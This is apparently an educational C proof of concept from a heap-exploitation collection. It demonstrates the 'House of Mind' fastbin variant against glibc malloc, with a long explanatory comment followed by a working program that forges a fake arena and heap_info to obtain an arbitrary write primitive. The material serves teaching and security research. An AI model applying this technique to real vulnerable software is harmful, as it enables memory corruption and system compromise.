
# House of Mind - Fastbin Variant

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

/*
House of Mind - Fastbin Variant
=================================
This attack is similar to the original 'House of Mind' in that it uses a fake non-main arena in order to write to a new location. This uses the fastbin for a WRITE-WHERE primitive in the 'fastbin' variant of the original attack though. The original write for this can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984.
By being able to allocate an arbitrary amount of chunks, a single byte overwrite on a chunk size and a memory leak, we can control a super powerful primitive.
This could be used in order to write a freed pointer to an arbitrary location (which seems more useful). Or, this could be used as a write-large-value-WHERE primitive (similar to unsortedbin attack). Both are interesting in their own right though but the first option is the most powerful primitive, given the right setting.
Malloc chunks have a specified size and this size information special metadata properties (prev_inuse, mmap chunk and non-main arena). The usage of non-main arenas is the focus of this exploit. For more information on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/.
First, we need to understand HOW the non-main arena is known from a chunk.
This the 'heap_info' struct:
struct _heap_info
{
mstate ar_ptr; // Arena for this heap. <-- Malloc State pointer
struct _heap_info *prev; // Previous heap.
size_t size; // Current size in bytes.
size_t mprotect_size; // Size in bytes that has been mprotected
char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK]; // Proper alignment
} heap_info;
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48
The important thing to note is that the 'malloc_state' within an arena is grabbed from the ar_ptr, which is the FIRST entry of this. Malloc_state === mstate === arena
The main arena has a special pointer. However, non-main arenas (mstate) are at the beginning of a heap section. They are grabbed with the following code below, where the user controls the 'ptr' in 'arena_for_chunk':
#define heap_for_ptr(ptr) \
((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE -1)))
#define arena_for_chunk(ptr) \
(chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127
This macro takes the 'ptr' and subtracts a large value because the 'heap_info' should be at the beginning of this heap section. Then, using this, it can find the 'arena' to use.
The idea behind the attack is to use a fake arena to write pointers to locations where they should not go but abusing the 'arena_for_chunk' functionality when freeing a fastbin chunk.
This POC does the following things:
- Finds a valid arena location for a non-main arena.
- Allocates enough heap chunks to get to the non-main arena location where we can control the values of the arena data.
- Creates a fake 'heap_info' in order to specify the 'ar_ptr' to be used as the arena later.
- Using this fake arena (ar_ptr), we can use the fastbin to write to an unexpected location of the 'ar_ptr' with a heap pointer.
Requirements:
- A heap leak in order to know where the fake 'heap_info' is located at.
- Could be possible to avoid with special spraying techniques
- An unlimited amount of allocations
- A single byte overflow on the size of a chunk
- NEEDS to be possible to put into the fastbin.
- So, either NO tcache or the tcache needs to be filled.
- The location of the malloc state(ar_ptr) needs to have a value larger than the fastbin size being freed at malloc_state.system_mem otherwise the chunk will be assumed to be invalid.
- This can be manually inserted or CAREFULLY done by lining up values in a proper way.
- The NEXT chunk, from the one that is being freed, must be a valid size (again, greater than 0x20 and less than malloc_state.system_mem)
Random perks:
- Can be done MULTIPLE times at the location, with different sized fastbin chunks.
- Does not brick malloc, unlike the unsorted bin attack.
- Only has three requirements: Infinite allocations, single byte buffer overflow and a heap memory leak.
**********************
Written up by Maxwell Dulin (Strikeout)
**********************
*/

int main(){
printf("House of Mind - Fastbin Variant\n");
puts("==================================");
printf("The goal of this technique is to create a fake arena\n");
printf("at an offset of HEAP_MAX_SIZE\n");
printf("Then, we write to the fastbins when the chunk is freed\n");
printf("This creates a somewhat constrained WRITE-WHERE primitive\n");
// Values for the allocation information.
int HEAP_MAX_SIZE = 0x4000000;
int MAX_SIZE = (128*1024) - 0x100;
// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635

printf("Find initial location of the heap\n");
// The target location of our attack and the fake arena to use
uint8_t* fake_arena = malloc(0x1000);
uint8_t* target_loc = fake_arena + 0x30;
uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

/*
Prepare a valid 'malloc_state' (arena) 'system_mem' to store a fastbin...
*/
printf("Set 'system_mem' (offset 0x888) for fake arena\n");
fake_arena[0x888] = 0xFF;
fake_arena[0x889] = 0xFF;
fake_arena[0x88a] = 0xFF;

printf("Target Memory Address for overwrite: %p\n", target_loc);
printf("Must set data at HEAP_MAX_SIZE (0x%x) offset\n", HEAP_MAX_SIZE);

// Calculate the location of our fake arena
uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

uint64_t* user_mem = malloc(MAX_SIZE);
printf("Fake Heap Info struct location: %p\n", fake_heap_info);
printf("Allocate until we reach a MAX_HEAP_SIZE offset\n");

/*
The fake arena must be at a particular offset on the heap...
*/
while((long long)user_mem < new_arena_value){
user_mem = malloc(MAX_SIZE);
}

// Use this later to trigger craziness
printf("Create fastbin sized chunk to be victim of attack\n");
uint64_t* fastbin_chunk = malloc(0x50);
// Size of 0x60
uint64_t* chunk_ptr = fastbin_chunk - 2;
// Point to chunk instead of mem
printf("Fastbin Chunk to overwrite: %p\n", fastbin_chunk);

printf("Fill up the TCache so that the fastbin will be used\n");
// Fill the tcache to make the fastbin to be used later.
uint64_t* tcache_chunks[7];
for(int i = 0; i < 7; i++){
tcache_chunks[i] = malloc(0x50);
}
for(int i = 0; i < 7; i++){
free(tcache_chunks[i]);
}

/*
Create a FAKE malloc_state pointer for the heap_state
This is the 'ar_ptr' of the 'heap_info' struct shown above.
...
*/
printf("Setting 'ar_ptr' (our fake arena) in heap_info struct to %p\n", fake_arena);
fake_heap_info[0] = (uint64_t) fake_arena;
// Setting the fake ar_ptr (arena)
printf("Target Write at %p prior to exploitation: 0x%x\n", target_loc, *(target_loc));

/*
Set the non-main arena bit on the size...
*/
// Vulnerability! Overwriting the chunk size
printf("Set non-main arena bit on the fastbin chunk\n");
puts("NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n");
chunk_ptr[1] = 0x60 | 0x4;
// Setting the non-main arena bit

// End vulnerability

printf("When we free the fastbin chunk with the non-main arena bit\n");
printf("set, it will cause our fake 'heap_info' struct to be used.\n");
printf("This will dereference our fake arena location and write\n");
printf("the address of the heap to an offset of the arena pointer.\n");

printf("Trigger the magic by freeing the chunk!\n");
free(fastbin_chunk);
// Trigger the madness

// For this particular fastbin chunk size, the offset is 0x28.
printf("Target Write at %p: 0x%llx\n", target_loc, *((unsigned long long*) (target_loc)));
assert(*((unsigned long*) (target_loc)) != 0);
}
```
